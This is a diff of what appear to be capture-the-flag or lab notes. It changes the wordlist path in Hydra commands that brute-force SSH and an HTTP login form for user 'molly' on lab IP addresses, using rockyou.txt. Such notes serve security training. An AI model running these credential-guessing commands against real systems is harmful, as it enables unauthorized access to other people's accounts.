@@ -14,9 +14,9 @@ hydra -l <username> -P <full path to pass> 10.10.33.240 -t 4 ssh
 hydra -l <username> -P <wordlist> 10.10.33.240 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
 
-hydra -l molly -P rockyou.txt 10.10.154.209 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+hydra -l molly -P ../../Materials/KaliWordlists/rockyou.txt 10.10.154.209 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
-hydra -l molly -P rockyou.txt 10.10.154.209 ssh
+hydra -l molly -P ../../Materials/KaliWordlists/rockyou.txt 10.10.154.209 ssh
 
 ssh molly@10.10.154.209	
 ```
